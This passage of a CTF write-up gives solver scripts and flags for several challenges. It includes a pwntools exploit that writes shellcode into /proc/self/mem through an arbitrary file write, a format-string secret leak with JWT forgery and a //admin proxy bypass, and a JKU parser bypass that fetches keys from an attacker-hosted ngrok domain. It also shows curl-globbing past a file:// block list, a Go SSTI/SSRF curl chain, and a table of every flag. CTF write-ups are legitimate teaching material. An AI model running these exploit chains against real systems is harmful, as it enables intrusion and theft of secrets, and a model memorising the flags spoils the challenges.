            for oct_str in parts[1:]:
                try:
                    val = int(oct_str, 8)
                    # Handle Little Endian (2-byte short)
                    output.append(val & 0xFF)
                    high_byte = (val >> 8) & 0xFF
                    if high_byte: output.append(high_byte)
                except ValueError: pass
        return output
    except Exception as e:
        print(f"[-] Error reversing OD: {e}")
        return None

def main():
    if not os.path.exists(ENC_FILE):
        print(f"[-] File {ENC_FILE} missing.")
        return

    print(f"[*] Recovered Password: {PASSWORD}")
    
    # Try decryption with MD5 (Legacy OpenSSL) which was common in older CTF challenges
    cmd = [
        'openssl', 'enc', '-d', '-aes-256-cbc',
        '-in', ENC_FILE,
        '-pass', f'pass:{PASSWORD}',
        '-md', 'md5' 
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True)
        output = result.stdout
        
        # Check for magic bytes: 'od' output always starts with offset '0000000'
        if output.startswith(b'0000000'):
            print(f"[+] Decryption Successful!")
            
            with open(DUMP_FILE, 'wb') as f:
                f.write(output)
            
            flag_data = reverse_od_to_text(DUMP_FILE)
            
            if flag_data:
                print("\n" + "="*40)
                print("FLAG CONTENT:")
                print("="*40)
                print(flag_data.decode('utf-8', errors='ignore'))
                
                # Cleanup
                if os.path.exists(DUMP_FILE): os.remove(DUMP_FILE)
        else:
            print("[-] Decryption failed (Bad Password or Wrong Digest).")
            print(f"Stderr: {result.stderr.decode()}")

    except Exception as e:
        print(f"[-] Execution Error: {e}")

if __name__ == "__main__":
    main()
```

### 3. Proof of Concept

Running the script successfully decrypted the environment variable dump and printed the flag.

**Flag:** `C2C{it_is_just_4_very_s1mpl3_l1nuX_k3ylogger_xixixi_haiyaaaaa_ez}`

---

## Pwn: ns3 (100 pts)

**AI Usage:** Yes

> Author: msfir
>
> It's not S3, but it's not such a simple server either. Or maybe it is?

### 1. Description

The "ns3" challenge features a custom C++ HTTP server running inside a Docker container. Initial source code review revealed two critical endpoints handled by `server.cpp`: `process_get` and `process_put`.

**Key Vulnerabilities:**

- **Arbitrary File Read (Local File Inclusion):** The `process_get` function allows Arbitrary File Read by passing a user-controlled path to the `open()` syscall without sanitization.

- **Arbitrary File Write:** The `process_put` function allows Arbitrary File Write, also without path sanitization, and crucially, accepts an offset parameter parsed from the URL, which is passed directly to `lseek()`.

**Initial Reconnaissance:**

While exploring the LFI by reading `/proc/self/environ`, the Kubernetes environment variables were exposed, but the flag was missing. A review of the `run.sh` entrypoint script revealed that `GZCTF_FLAG` is written to a randomized file (`/flag-[64-hex-chars]`) and then unset. Because the filename is unpredictable, simple Arbitrary File Read is insufficient. **Remote Code Execution (RCE) is required** to capture the flag.

### 2. Solution (Reproducible)

To achieve RCE, we exploit the Arbitrary File Write vulnerability to overwrite the executable memory of the running process via the Linux pseudo-file `/proc/self/mem`. Because the server supports `HTTP Connection: keep-alive`, we can leak memory addresses and overwrite the memory within the same process lifecycle before it exits.

**Step 1: Leak Base Address**

Leak the base address of the running binary by reading `/proc/self/maps` via a GET request.

**Step 2: Calculate Target Address**

Parse the base address and calculate the absolute memory address of a target function (in this case, `send_response`, which is called immediately after a request is processed).

**Step 3: Inject Shellcode**

Send a PUT request to `/proc/self/mem` specifying the target function's address as the offset. The payload is shellcode designed to copy the randomized flag file to `/tmp/f.txt`.

**Step 4: Retrieve the Flag**

Send a standard GET request to read `/tmp/f.txt`.

**Exploit Script (`solve.py`):**

```python
from pwn import *
import time

# Configuration
context.log_level = 'info'
HOST = 'challenges.1pc.tf'
PORT = 28817

# Load local binary to calculate offsets
try:
    elf = ELF('./server')
except:
    log.error("File 'server' not found!")
    exit(1)

def exploit():
    p = remote(HOST, PORT)

    # 1. Leak Base Address from /proc/self/maps
    log.info("Leaking memory map from /proc/self/maps...")
    p.send(b"GET /?path=/proc/self/maps HTTP/1.1\r\nConnection: keep-alive\r\n\r\n")

    maps_data = p.recvuntil(b"/app/server")
    lines = maps_data.split(b'\n')
    base_addr = 0
    for line in lines:
        if b"/app/server" in line:
            base_addr = int(line.split(b'-')[0], 16)
            break
            
    log.success(f"Base Address: {hex(base_addr)}")

    # 2. Calculate absolute address of 'send_response'
    target_sym = [s for s in elf.symbols.keys() if 'send_response' in s][0]
    target_offset = elf.symbols[target_sym]
    target_addr = base_addr + target_offset
    log.info(f"Target address (send_response): {hex(target_addr)}")

    # 3. Create Shellcode to copy the flag
    context.arch = 'amd64'
    cmd = "cat /flag* > /tmp/f.txt"
    shellcode = asm(shellcraft.amd64.linux.execve('/bin/sh', ['sh', '-c', cmd], 0))

    # 4. Overwrite memory via Arbitrary File Write to /proc/self/mem
    log.info("Overwriting memory and executing shellcode...")
    req = f"PUT /?path=/proc/self/mem&offset={target_addr} HTTP/1.1\r\n"
    req += f"Content-Length: {len(shellcode)}\r\n"
    req += "Connection: keep-alive\r\n\r\n"
    
    p.send(req.encode() + shellcode)
    time.sleep(1)
    p.close()

    # 5. Read the copied flag
    log.info("Reading flag from /tmp/f.txt...")
    p2 = remote(HOST, PORT)
    p2.send(b"GET /?path=/tmp/f.txt HTTP/1.1\r\nConnection: close\r\n\r\n")
    
    res = p2.recvall().decode(errors='ignore')
    if "C2C{" in res or "GZCTF{" in res:
        flag = res[res.find('\r\n\r\n')+4:].strip()
        log.success(f"FLAG CAPTURED: {flag}")
    else:
        print(res)

if __name__ == '__main__':
    exploit()
```

### 3. Proof of Concept

By running the exploit script against the target, the memory is successfully overwritten without crashing the process. The shellcode executes, copying the dynamically named flag file to a predictable location (`/tmp/f.txt`), which is then successfully read via the LFI vulnerability.

**Flag:** `C2C{linUX_f1IE_SYs7eM_Is_qu173_M1Nd_810wiNg_iSN't_i7_52f125ca9bc2?}`

---

## Reverse Engineering: bunaken (100 pts)

**AI Usage:** Yes

> Author: msfir
>
> Can you help me to recover the flag?

### AI Usage Declaration

**Model Used:** Gemini 3 Pro  
**Subscription Tier:** Paid

**Prompts Used:**
- "bantu saya mengerjakan soal dengan tipe reverse engineering ini, berikut progress saya..."
- "strings bunaken | grep -C 20 'flag.txt'"
- "Analyze the JavaScript logic and provide a solver."

**Methodology:** Used AI to identify the obfuscated JavaScript logic within the binary. Verified the AI's hypothesis by creating a modified JavaScript payload (get_key.js) to extract the hardcoded key, confirming it against the binary's runtime behavior. The final Python decryption script was generated by AI and manually corrected to handle Base64 decoding and AES block size constraints.

### 1. Description & Reconnaissance

**Challenge:** Bunaken  
**Category:** Reverse Engineering  
**Points:** 100

The challenge provided a binary named bunaken and an encrypted file flag.txt.bunakencrypted.

Initial analysis using file and execution revealed it was a Bun runtime executable:

```bash
$ file bunaken
bunaken: ELF 64-bit LSB executable, x86-64...
$ ./bunaken
... Bun v1.3.6 (Linux x64)
```

Since Bun bundles JavaScript/TypeScript into the binary, I attempted to extract readable strings to find the source logic.

```bash
strings bunaken | grep -C 20 "flag.txt" > source_dump.js
```

The dump revealed obfuscated JavaScript code using crypto.subtle for AES-CBC encryption.

### 2. Solution (Reproducible)

**Step 1: Extracting the Encryption Key**

The JavaScript logic contained a highly obfuscated string array and a shifting function. Instead of manually reversing the de-obfuscation routine, I extracted the relevant functions and modified the code to print the secret key instead of executing the encryption.

I created get_key.js with the extracted logic and a payload to print the secret:

```javascript
// get_key.js
function w() {
    let n = ["WR0tF8oezmkl", "toString", "W603xSol", "1tlHJnY", "1209923ghGtmw", "text", "13820KCwBPf", "byteOffset", "40xRjnfn", "Cfa9", "bNaXh8oEW6OiW5FcIq", "alues", "lXNdTmoAgqS0pG", "D18RtemLWQhcLConW5a", "nCknW4vfbtX+", "WOZcIKj+WONdMq", "FCk1cCk2W7FcM8kdW4y", "a8oNWOjkW551fSk2sZVcNa", "yqlcTSo9xXNcIY9vW7dcS8ky", "from", "iSoTxCoMW6/dMSkXW7PSW4xdHaC", "c0ZcS2NdK37cM8o+mW", "377886jVoqYx", "417805ESwrVS", "7197AxJyfv", "cu7cTX/cMGtdJSowmSk4W5NdVCkl", "W7uTCqXDf0ddI8kEFW", "write", "encrypt", "ted", "xHxdQ0m", "byteLength", "6CCilXQ", "304OpHfOi", "set", "263564pSWjjv", "subtle", "945765JHdYMe", "SHA-256", "Bu7dQfxcU3K", "getRandomV"];
    return w = function() { return n }, w()
}

function l(n, r) { return n = n - 367, w()[n] }
var y = l, s = c;

function c(n, r) {
    n = n - 367;
    let t = w(), x = t[n];
    if (c.uRqEit === void 0) {
        var b = function(i) {
            let f = "", a = "";
            for (let d = 0, o, e, p = 0; e = i.charAt(p++); ~e && (o = d % 4 ? o * 64 + e : e, d++ % 4) ? f += String.fromCharCode(255 & o >> (-2 * d & 6)) : 0) e = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(e);
            for (let d = 0, o = f.length; d < o; d++) a += "%" + ("00" + f.charCodeAt(d).toString(16)).slice(-2);
            return decodeURIComponent(a)
        };
        let U = function(i, B) {
            let f = [], a = 0, d, o = "";
            i = b(i);
            let e;
            for (e = 0; e < 256; e++) f[e] = e;
            for (e = 0; e < 256; e++) a = (a + f[e] + B.charCodeAt(e % B.length)) % 256, d = f[e], f[e] = f[a], f[a] = d;
            e = 0, a = 0;
            for (let p = 0; p < i.length; p++) e = (e + 1) % 256, a = (a + f[e]) % 256, d = f[e], f[e] = f[a], f[a] = d, o += String.fromCharCode(i.charCodeAt(p) ^ f[(f[e] + f[a]) % 256]);
            return o
        };
        c.yUvSwA = U, c.MmZTqk = {}, c.uRqEit = !0
    }
    let u = t[0], I = n + u, A = c.MmZTqk[I];
    return !A ? (c.ftPoNg === void 0 && (c.ftPoNg = !0), x = c.yUvSwA(x, r), c.MmZTqk[I] = x) : x = A, x
}

// Hook to print the secret key
console.log("Recovered Key: " + s(373, "rG]G"));
Running the script:

Bash
$ bun run get_key.js
Recovered Key: sulawesi
Step 2: Decrypting the Flag
With the key sulawesi recovered, I analyzed the encryption parameters from the JS source:

Algorithm: AES-CBC

Key Derivation: SHA-256 of the passphrase, truncated to the first 16 bytes.

Data Format: The file contained Base64 encoded data (inferred from length analysis), structured as [16 bytes IV][Ciphertext].

I wrote a Python script to perform the decryption:

Python
import hashlib
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

PASSPHRASE = "sulawesi"
FILENAME = "flag.txt.bunakencrypted"

def solve():
    # 1. Derive Key: SHA-256(passphrase)[:16]
    key = hashlib.sha256(PASSPHRASE.encode()).digest()[:16]
    
    # 2. Read and Decode Base64 content
    with open(FILENAME, "r") as f:
        data = base64.b64decode(f.read().strip())
    
    # 3. Extract IV and Ciphertext
    iv = data[:16]
    ciphertext = data[16:]
    
    # 4. Decrypt AES-CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    
    # 5. Remove Padding (PKCS7) and Print
    pad_len = plaintext[-1]
    flag = plaintext[:-pad_len].decode('utf-8')
    print(f"Flag: {flag}")

if __name__ == "__main__":
    solve()
```

### 3. Proof of Concept

Executing the solver script yielded the flag:

```bash
$ python3 solve.py
Flag: C2C{BUN_AwKward_ENcryption_compression_obfuscation}
```

**Flag:** `C2C{BUN_AwKward_ENcryption_compression_obfuscation}`

---


## Web: corp-mail (100 pts)

**AI Usage:** Yes

> Author: lordrukie x beluga
>
> Rumor said that my office's internal email system was breached somewhere... must've been the wind.

### 1. Description

We are provided with the source code for a Flask-based email application. The architecture includes an HAProxy load balancer sitting in front of the Flask app.

**Key Findings from Source Code Analysis:**

**HAProxy Restriction:** `haproxy/haproxy.cfg` denies access to `/admin`.

```haproxy
http-request deny if { path -i -m beg /admin }
```

**Vulnerable Function:** `flask_app/application/utils.py` contains a Python String Format Injection vulnerability.

```python
def format_signature(signature_template, username):
    # ...
    return signature_template.format(
        username=username,
        date=now.strftime('%Y-%m-%d'),
        app=current_app  # <--- VULNERABILITY: 'app' object is passed to format
    )
```

**Flag Location:** `flask_app/application/db.py` shows the flag is seeded into an email sent from the Admin to a user named Mike.

### 2. Solution (Reproducible)

**Step 1: Leak the JWT Secret**

The format_signature function passes the current_app object to str.format(). This allows us to access the application configuration, which contains the JWT_SECRET.

1. Register a new account and log in.

2. Navigate to Settings.

3. In the "Signature" field, inject the following payload to dump the config:

```
{app.config}
```

4. Save the signature. The page will reload and display the configuration dictionary.

5. Extract the JWT_SECRET string from the output.

Example Secret found: `d1e2...[hex_string]...f4a`

**Step 2: Forge an Admin Token**

With the secret, we can sign our own JWT. The database initialization (db.py) sets the Admin user with id=1 and is_admin=1.

Solver script (`solve_token.py`):

```python
import jwt
from datetime import datetime, timedelta

# REPLACE THIS with the secret extracted from Step 1
LEAKED_SECRET = "REPLACE_WITH_ACTUAL_HEX_SECRET_FROM_WEBSITE" 

payload = {
    'user_id': 1,       # Admin ID from db.py
    'username': 'admin',
    'is_admin': 1,      # Privileged access
    'exp': datetime.utcnow() + timedelta(hours=24)
}

# Config.py specifies algorithm HS256
token = jwt.encode(payload, LEAKED_SECRET, algorithm='HS256')
print(f"Forged Token: {token}")
```

**Step 3: HAProxy Bypass & Flag Retrieval**

The HAProxy rule `path -i -m beg /admin` blocks paths starting exactly with `/admin`. However, Flask normalizes URLs, meaning `//admin` is treated as `/admin` by Flask but bypasses the HAProxy rule.

1. Open Developer Tools (F12) → Application → Cookies.

2. Replace the value of the token cookie with the Forged Token generated in Step 2.

3. Navigate to the Sent folder using the double-slash bypass:

```
https://challenges.1pc.tf:48250//admin/sent
```

4. Locate the email with the subject "Confidential: System Credentials".

5. Open the email to retrieve the flag.

### 3. Proof of Concept

Successfully accessed the admin panel using the forged token and URL normalization bypass. The flag was found in the body of the confidential email sent by the admin.

**Flag:** `C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_afca42b8b3c1}`

---



## Web: clicker (100 pts)

**AI Usage:** Yes

> Author: lordrukie x beluga
>
> Im too addicted to this clicker game, so i decided to make it myself.

### 1. Description

Initial reconnaissance of the provided source code revealed two distinct vulnerabilities:

**Authentication Bypass via JKU Parser Discrepancy:** The application uses JWTs for authentication and fetches the public key from a provided jku URL. The custom URL parser (utils/url_parser.py) contains a logic flaw. It splits the domain by @ and extracts parts[1]. By providing a URL like `https://foo@localhost@attacker.com/jwks.json`, the custom parser validates it as localhost (bypassing the restriction), but the underlying requests library treats `foo@localhost` as basic authentication credentials and connects to attacker.com.

**Filter Bypass via Curl Globbing:** The admin panel features a file download utility (routes/admin.py) that uses `subprocess.run(['curl', ...])`. A python blocklist prevents the use of the `file://` protocol. However, curl supports URL globbing. Providing `{x,file}:///flag.txt` bypasses the python string check, but curl expands it to read the local file system.

### 2. Solution (Reproducible)

**Step 1: Forge the JWT and Host JWKS**

To exploit the JKU parser discrepancy, I generated a custom RSA keypair, created a valid `jwks.json` exposing the public key, and signed a forged JWT containing `"is_admin": True` and the malicious jku URL in the payload.

I used ngrok to expose a local HTTP server hosting the generated `jwks.json` on port 80:

```bash
ngrok http 80
```

(Ngrok domain obtained: unopinionated-precollapsible-mozelle.ngrok-free.dev)

Exploit script (`exploit.py`):

```python
import jwt
import json
import base64
import time
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Attacker's Ngrok Domain
ATTACKER_DOMAIN = "unopinionated-precollapsible-mozelle.ngrok-free.dev" 

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')

print("[*] Generating new RSA key pair...")
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

jwks_data = {
    "keys": [
        {
            "kty": "RSA",
            "kid": "key1",
            "use": "sig",
            "alg": "RS256",
            "n": int_to_base64(public_numbers.n),
            "e": int_to_base64(public_numbers.e)
        }
    ]
}

with open('jwks.json', 'w') as f:
    json.dump(jwks_data, f, indent=4)
print("[+] jwks.json updated successfully!")

# Bypass URL using HTTPS to prevent requests library from failing on redirects
jku_url = f"https://foo@localhost@{ATTACKER_DOMAIN}/jwks.json"

payload = {
    "user_id": 1,
    "username": "admin",
    "is_admin": True,
    "exp": int(time.time()) + 86400,
    "jku": jku_url
}

headers = {
    "kid": "key1"
}

private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

token = jwt.encode(payload, private_pem, algorithm="RS256", headers=headers)

print("\n[+] Forged JWT Token:")
print(token)
```

After running the script, I hosted the directory containing `jwks.json`:

```bash
python3 -m http.server 80
```

**Step 2: Inject the Forged JWT**

To maintain the session and bypass frontend checks in admin.html, both the browser cookies and localStorage must be updated.

I logged into a standard account on the CTF instance, opened the Browser Developer Console (F12), and executed the following JavaScript:

```javascript
// Replace with the JWT output from exploit.py
let fakeToken = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleTEiLCJ0eXAiOiJKV1QifQ..."; 

localStorage.setItem('token', fakeToken);
localStorage.setItem('is_admin', 'true');
localStorage.setItem('username', 'admin');

document.cookie = "token=" + fakeToken + "; path=/";
window.location.href = "/admin";
```

**Step 3: Bypass URL Filter to Read Flag**

Once authenticated to the `/admin` panel, I navigated to the DOWNLOAD URL tab under MANAGE FILES.

To bypass the `blocked_protocols` check in `/api/admin/download`, I leveraged curl's globbing functionality to obfuscate the `file://` scheme. I submitted the following payload:

- **FILE TYPE:** IMAGE
- **TITLE:** Flag CTF
- **FILE URL:** `{x,file}:///flag.txt`
- **SAVE AS FILENAME:** flag.txt

The backend python script passed the string, and the underlying curl command executed the download, saving `/flag.txt` into the `/static/` directory.

### 3. Proof of Concept

The file was successfully downloaded to the static directory. Navigating to `http://challenges.1pc.tf:26166/static/flag.txt` exposed the contents of the flag file.

**Flag:** `C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_a246121eaad4}`

---



## Web: The Soldier of God, Rick (100 pts)

**AI Usage:** Yes

> Author: dimas
>
> Can you defeat the Soldier of God, Rick?

**Tools to Use:**

Reverse Engineering Golang:
- Ghidra - Open source reverse engineering suite.
- Ghidra Golang Extension - Extension to support Golang in Ghidra.
- IDA Pro/Free - Standard disassembler (Free version matches basic needs).

Helper Tools:
- `go_embed_extractor.py` - Script to extract embedded files from the binary.
- Burp Suite - Essential for interception and modifying web traffic.

### AI Usage Declaration

**Model Used:** Gemini  
**Subscription Tier:** Standard/Free Tier

**Prompts Used:**
- "Saya sedang mengerjakan tantangan CTF Binary Exploitation/Pwn bernama 'Soldier of God, Rick' yang dibuat dengan bahasa Go. Program ini menjalankan server web pada port 8080 dengan endpoint utama / dan /fight. Berikut adalah data teknis yang saya temukan..."

**Methodology:** The AI's theoretical suggestions were verified directly using dynamic analysis. I used GDB with the gef plugin to set breakpoints and inspect memory registers ($rdx+0x18) to extract the exact runtime.memequal comparison string. For the web exploits, I sequentially tested the SSTI payloads via curl against the local instance to map out the application's response to SSRF and 64-to-32-bit integer truncation before deploying the final exploit chain against the remote instance.

### 1. Description & Reconnaissance

**Challenge:** The Soldier of God, Rick  
**Category:** Web / Binary Exploitation  
**Points:** 100

The challenge provides a Go binary running a web server with `/` and `/fight` endpoints. The objective is to defeat a boss ("Rick") with an "infinite" (999999) HP pool.

**Initial Reconnaissance:**

- **Secret Validation:** The `/fight` endpoint requires a secret. Static analysis hinted at a SHA-512 hash reversing to "I am Soldier of God, Rick.", but this was a rabbit hole. The validation relies on `runtime.memequal`.

- **Go SSTI:** The `battle_cry` parameter is processed directly by `html/template.Parse`, indicating a Server-Side Template Injection (SSTI) vulnerability.

- **Hidden Endpoint:** An internal endpoint `/internal/offer-runes` exists, demanding a positive amount (> 0) to deduct HP.

### 2. Solution (Reproducible)

**Step 1: Bypassing the Secret Validation**

Since `runtime.memequal` is strict on length and bytes, static string guessing fails. I used GDB to dynamically extract the expected string from memory right before the length-check instruction:

```bash
# Start debugging
gdb ./rick_soldier

# Disassemble and find the string length comparison before runtime.memequal
disassemble 'rick/router.(*Handler).Fight'

# Set breakpoint at the comparison instruction
b *0x000000000076e640

# Run with a dummy secret
run
# (Sent POST request with secret=I am Soldier of God, Rick.)

# Read the giant hex pointer at RDX+0x18, then read the string at that address
x/gx $rdx+0x18
x/s 0x000000c0000284ee
```

**Result:** The actual secret in memory was `Morty_Is_The_Real_One\n`. Note: Stripping the URL-encoded newline in the final curl payload successfully bypassed the check.

**Step 2: Exploiting SSTI to find SSRF Gadgets**

With the secret bypassed, I leveraged the SSTI to dump the template context. Using strings, I dumped the binary to find exported methods available to the template engine:

```bash
strings rick_soldier | grep "rick/"
```

**Result:** Discovered `rick/entity.(*Rick).Scout` (useful for SSRF) and `rick/router.(*BattleView).Secret` (the flag retrieval method).

**Step 3: SSRF and Integer Truncation (Perfect Kill)**

To defeat the boss, I needed to trigger `/internal/offer-runes` via the `.Scout` method. The endpoint enforces an `amount > 0` rule.

Sending a standard massive number (9223372036854775808) caused a standard integer overflow, resulting in -1 HP. However, the system requires exactly 0 HP to yield the flag (Perfect Kill).

By exploiting a 64-bit to 32-bit type confusion/truncation, I passed 4294967296 ($2^{32}$). This passes the positive integer check (> 0), but when truncated to an int32 memory space during the HP calculation, it becomes exactly 0.

**Step 4: The Exploit Chain**

The final payload combines the SSTI, SSRF, Type Confusion, and method chaining to execute the kill and retrieve the flag simultaneously on the remote instance:

```bash
# Execute the exploit against the remote target
curl -X POST http://<REMOTE_IP>:<REMOTE_PORT>/fight \
     -d "secret=Morty_Is_The_Real_One" \
     -d 'battle_cry={{ $kill := .Rick.Scout "http://localhost:8080/internal/offer-runes?amount=4294967296" }}{{ .Secret }}'
```

### 3. Proof of Concept

Executing the payload successfully manipulated the internal memory logic, dropping the Boss HP to exactly 0, triggering the `IsDead()` boolean, and returning the flag via the `.Secret` method rendering.

**Flag:** `C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_d4e07120a31a}`

---

## 🏁 Final Summary of Flags

| Category | Challenge Name | Points | Flag |
|----------|---|--------|------|
| Misc | Welcome | 100 | `C2C{welcome_to_c2c}` |
| Misc | JinJail | 100 | `C2C{damnnn_i_love_numpy_078c3e1922c0}` |
| Blockchain | tge | 100 | `C2C{just_a_warmup_from_someone_who_barely_warms_up}` |
| Blockchain | Convergence | 100 | `C2C{the_convergence_chall_is_basically_bibibibi}` |
| Blockchain | nexus | 100 | `C2C{the_essence_of_nexus_is_donation_hahahaha}` |
| Forensic | Log | 100 | `C2C{7H15_15_V3rY_345Y_68249ea0153b}` |
| Forensic | Tattletale | 100 | `C2C{it_is_just_4_very_s1mpl3_l1nuX_k3ylogger_xixixi_haiyaaaaa_ez}` |
| Pwn | ns3 | 100 | `C2C{linUX_f1IE_SYs7eM_Is_qu173_M1Nd_810wiNg_iSN't_i7_52f125ca9bc2?}` |
| Reverse Eng | bunaken | 100 | `C2C{BUN_AwKward_ENcryption_compression_obfuscation}` |
| Web | corp-mail | 100 | `C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_afca42b8b3c1}` |
| Web | clicker | 100 | `C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_a246121eaad4}` |
| Web | The Soldier of God, Rick | 100 | `C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_d4e07120a31a}` |


